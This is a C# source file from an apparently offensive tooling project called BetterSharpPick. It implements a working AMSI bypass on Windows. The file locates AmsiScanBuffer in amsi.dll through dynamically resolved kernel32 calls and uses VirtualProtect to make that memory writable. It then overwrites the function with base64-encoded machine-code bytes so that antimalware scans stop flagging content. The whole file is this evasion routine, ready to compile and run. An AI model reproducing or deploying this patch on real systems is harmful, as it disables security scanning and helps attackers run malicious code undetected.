using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static BetterSharpPick.Patch.Common;

namespace BetterSharpPick.Patch
{
    public class AMSI
    {
        public static void Patch()
        {

            IntPtr amsiLibPtr = unProtect(getAMSILocation());
            if (amsiLibPtr != (IntPtr)0)
            {
                Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
                Console.WriteLine("[+] Successfully patched AMSI!");
            }
            else
            {
                Console.WriteLine("[!] Patching AMSI FAILED");
            }
        }

        private static IntPtr unProtect(IntPtr amsiLibPtr)
        {

            IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

            VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            uint newMemSpaceProtection = 0;
            if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
            {
                return amsiLibPtr;
            }
            else
            {
                return (IntPtr)0;
            }

        }

        private static IntPtr getAMSILocation()
        {
            //GetProcAddress
            IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
            IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");

            GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
            LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));

            return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
        }

        private static byte[] getAMSIPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("uFcAB4DCGAA=");
            return Convert.FromBase64String("uFcAB4DD");
        }
    }
}
